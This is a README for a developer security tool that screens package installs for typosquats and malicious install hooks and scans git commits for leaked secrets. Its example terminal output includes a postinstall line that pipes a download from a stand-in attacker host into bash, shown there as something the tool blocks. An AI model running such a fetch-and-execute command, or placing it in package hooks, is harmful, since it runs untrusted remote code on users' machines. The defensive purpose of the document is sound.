# 🏰 VibeFort

**Security layer for AI-assisted development. One command, permanent protection.**

VibeFort protects vibecoders (Cursor, Bolt, Replit, Claude Code users) from supply chain attacks, leaked secrets, and insecure AI-generated code. Run `vibefort install` once — it silently protects every package install and git commit forever.

## Quick Start

```bash
pipx install vibefort
vibefort install
```

That's it. You never type `vibefort` again.

> **Why pipx?** VibeFort is a system-wide CLI tool, not a project dependency. `pipx` installs it globally in an isolated environment — the standard way to install Python CLI tools. [Install pipx](https://pipx.pypa.io/stable/installation/) if you don't have it: `brew install pipx` (macOS) or `apt install pipx` (Ubuntu).

## What Happens After Install

```bash
# Normal pip usage — VibeFort intercepts silently
$ pip install flask
✔ flask 3.1.0 — clean (0.2s)

$ pip install reqeusts
✖ BLOCKED — Possible typosquat — similar to 'requests'
  Did you mean: requests

$ npm install evil-pkg
✖ BLOCKED — suspicious postinstall script: downloads external payload
  package.json: postinstall runs curl http://evil.com | bash

# Normal git usage — VibeFort scans staged files
$ git commit -m "add config"
✖ VibeFort blocked this commit — 1 secret(s) found
  Secret found in src/config.py:14
  AWS Access Key detected
```

## Supported Package Managers

VibeFort intercepts **10 package managers** across Python and Node.js:

### Python

| Manager | Commands intercepted |
|---|---|
| `pip` / `pip3` | `pip install flask`, `pip install flask==3.1.0` |
| `uv` | `uv pip install flask`, `uv add flask` |
| `pipx` | `pipx install black` |

### Node.js

| Manager | Commands intercepted |
|---|---|
| `npm` | `npm install`, `npm add`, `npm i` |
| `npx` | `npx create-react-app` (scans before execute) |
| `yarn` | `yarn add express` |
| `pnpm` | `pnpm add express` |
| `bun` | `bun add express` |
| `bunx` | `bunx cowsay` (scans before execute) |

> `npx` and `bunx` are especially dangerous — they download AND execute code in one step. VibeFort scans the package before allowing execution.

## How It Works

### Package Scanning (automatic)

Every package install goes through two tiers:

| Tier | What it checks | Speed | When |
|---|---|---|---|
| **Tier 1** | Known-safe cache (10k packages), typosquatting, registry existence, slopsquatting | < 500ms | Every install |
| **Tier 2** | Downloads to temp, inspects setup.py/package.json hooks, .pth files, obfuscated code | 3-5s | Unknown packages |

### Secret Scanning (automatic)

Git pre-commit hook powered by [betterleaks](https://github.com/betterleaks/betterleaks) (234 detection rules):

- AWS, OpenAI, Anthropic, GitHub, Stripe, Google API keys
- SSH/PGP private keys, JWT tokens
- Database connection strings
- And 220+ more patterns

### Coming Soon

- `vibefort scan .` — code vulnerability scanning (SQL injection, XSS, insecure deserialization)
- `vibefort infra .` — infrastructure auditing (Supabase, Firebase, open S3 buckets)
- `vibefort audit` — system compromise check
- AI-powered analysis with plain-English explanations

## Commands

| Command | Description |
|---|---|
| `vibefort install` | One-time setup: hooks + secret scanner |
| `vibefort uninstall` | Clean removal of all hooks |
| `vibefort status` | Dashboard with scan stats |
| `vibefort --version` | Show version |

## How Install Works

`vibefort install` does two things that persist forever:

1. **Shell hook** — Adds function wrappers to `~/.zshrc` or `~/.bashrc` that intercept all 10 package managers. Loads every time a terminal opens.

2. **Git hook** — Sets a global pre-commit hook via `git config --global core.hooksPath`. Applies to every repo.

A 🏰 castle icon appears in your terminal when VibeFort is active.

`vibefort uninstall` cleanly removes both.

## License

MIT — see [LICENSE](LICENSE).

Secret scanning powered by [betterleaks](https://github.com/betterleaks/betterleaks) (MIT). See [THIRD_PARTY_NOTICES](THIRD_PARTY_NOTICES).
